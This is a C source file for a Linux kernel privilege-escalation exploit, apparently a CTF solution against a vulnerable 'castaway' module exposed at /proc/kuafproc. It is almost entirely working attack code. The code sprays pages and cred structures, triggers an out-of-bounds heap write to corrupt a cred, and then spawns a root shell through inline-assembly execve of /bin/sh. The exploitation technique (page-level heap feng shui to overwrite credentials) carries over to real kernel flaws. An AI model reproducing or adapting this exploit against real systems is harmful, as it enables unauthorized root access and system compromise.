//gcc -masm=intel -static exploit.c -o exploit
//gcc -Os -static -masm=intel exploit.c -lutil -o exploit.c
//home/heap/heap_spray/pgv/exploit

#define _GNU_SOURCE
#include "mykernelpwn.h"

// #define tty_struct_size 0x2e0
// #define ptm_unix98_ops 0xffffffff8208eea0
// #define pty_unix98_ops 0xffffffff8208ed80
// #define commit_creds 0xffffffff810b7fb0
// #define prepare_kernel_cred 0xffffffff810b8360
// #define work_for_cpu_fn 0xffffffff810ac640

#define cred_spray_num 514

#define vul_obj_num 400
#define vul_obj_size 512
#define vul_obj_per_slub 8
#define vul_obj_slub_num (vul_obj_num / vul_obj_per_slub)

struct kuaf_note {
    size_t idx;
    size_t size;
    char* buf;
};

struct note_data {
    char* data;
};

struct timespec timer = {
    .tv_sec = 1145141919,
    .tv_nsec = 0,
};

int kuaf_fd;
int cmd_pipe_req[2], cmd_pipe_reply[2], check_root_pipe[2];
char  bin_sh_str[] = "/bin/sh";
char* shell_args[] = { bin_sh_str, NULL };
char  child_pipe_buf[1];
char  root_str[] = "\033[32m\033[1m[+] Successful to get the root.\n"
                   "\033[34m[*] Execve root shell now...\033[0m\n";

void kuaf_add(size_t idx)
{
    struct kuaf_note note = {
        .idx = idx,
    };
    ioctl(kuaf_fd, 0x112233, &note);
}


void kuaf_edit(size_t idx, char* buf, size_t size)
{
    struct kuaf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x223344, &note);
}


// 把 notebook[idx]->data 数据读到 buf
ssize_t kuaf_read(int idx, void* buf)
{
    return read(kuaf_fd, buf, idx);
}

int waiting_for_root_fn(void* args)
{
    // we're using the same stack for them, so we need to avoid cracking it...
    __asm__ volatile (
        "   lea rax, [check_root_pipe]; "
        "   xor rdi, rdi; "
        "   mov edi, dword ptr [rax]; "
        "   mov rsi, child_pipe_buf; "
        "   mov rdx, 1;   "
        "   xor rax, rax; "  // read(check_root_pipe[0], child_pipe_buf, 1)
        "   syscall;      "
        "   mov rax, 102; "  // getuid()
        "   syscall; "
        "   cmp rax, 0; "
        "   jne failed; "
        "   mov rdi, 1; "
        "   lea rsi, [root_str]; "
        "   mov rdx, 80; "
        "   mov rax, 1; "     // write(1, root_str, 71)
        "   syscall; "
        "   lea rdi, [bin_sh_str];  "
        "   lea rsi, [shell_args];  "
        "   xor rdx, rdx;   "
        "   mov rax, 59;    "
        "   syscall;        "   // execve("/bin/sh", args, NULL)
        "failed: "
        "   lea rdi, [timer]; "
        "   xor rsi, rsi; "
        "   mov rax, 35; "    // nanosleep()
        "   syscall; "
    );
    return 0;
}

__attribute__((naked)) long simple_clone(int flags, int (*fn)(void *))
{
    // for syscall, it's clone(flags, stack, ...) 
    __asm__ volatile (
        "   mov r15, rsi; "   // save the rsi
        "   xor rsi, rsi; "   // set esp and useless args to NULL
        "   xor rdx, rdx; "
        "   xor r10, r10; "
        "   xor r8, r8;   "
        "   xor r9, r9;   "
        "   mov rax, 56;  "   // __NR_clone
        "   syscall;      "
        "   cmp rax, 0;   "
        "   je child_fn;  "
        "   ret;          "   // parent
        "child_fn:      "
        "   jmp r15;      "   // child
    );
}

int alloc_page1(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

int main(int argc, char** argv, char** envp)
{

    char th_stack[0x1000], buf[0x1000];

    bind_core(0);

    // 打开 proc
    kuaf_fd = open("/proc/kuafproc", O_RDWR);
    if (kuaf_fd < 0) {
        err_exit("Failed to open /proc/kuafproc!");
    }

    // use a new process for page spraying
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    if (!fork()) {
        spray_cmd_handler();
        exit(EXIT_SUCCESS);
    }

    // make buddy's lower order clean, castaway_requesting from higher
    note_info("Spraying pgv pages...");
    for (int i = 0; i < PGV_PAGE_NUM; i++) {
        if(alloc_page1(i) < 0) {
            printf("\033[31m\033[1m[-] Failed at no.%d socket!\033[0m\n", i);
            err_exit("FAILED to spray pages via socket!");
        }
    }

    /* free pages for cred */
    note_info("Freeing for cred pages...");
    for (int i = 1; i < PGV_PAGE_NUM; i += 2){
        free_page(i);
    }

    // spray cred to get the isolate pages we released before
    note_info("Spraying cred...");
    pipe(check_root_pipe);
    for (int i = 0; i < cred_spray_num; i++) {
        if (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, 
                         waiting_for_root_fn) < 0){
            printf("\033[31m\033[1m[-] Failed at cloning %d child\033[0m\n", i);
            err_exit("FAILED to clone()!");
        }
    }

    // free pages for our vulerable objects
    note_info("Freeing for vulnerable pages...");
    for (int i = 0; i < PGV_PAGE_NUM; i += 2){
        free_page(i);
    }

    // spray vulnerable objects, hope that we can make an oob-write to cred
    note_info("Trigerring vulnerability in castaway kernel module...");
    memset(buf, '\0', 0x1000);
    *(uint32_t*) &buf[vul_obj_size - 6] = 1;    // cred->usage
    for (int i = 0; i < vul_obj_num; i++) {
        kuaf_add(i);
        kuaf_edit(i, buf, vul_obj_size);
    }

    // checking privilege in child processes
    note_info("Notifying child processes and waiting...");
    write(check_root_pipe[1], buf, cred_spray_num);
    sleep(1145141919);

    return 0;
}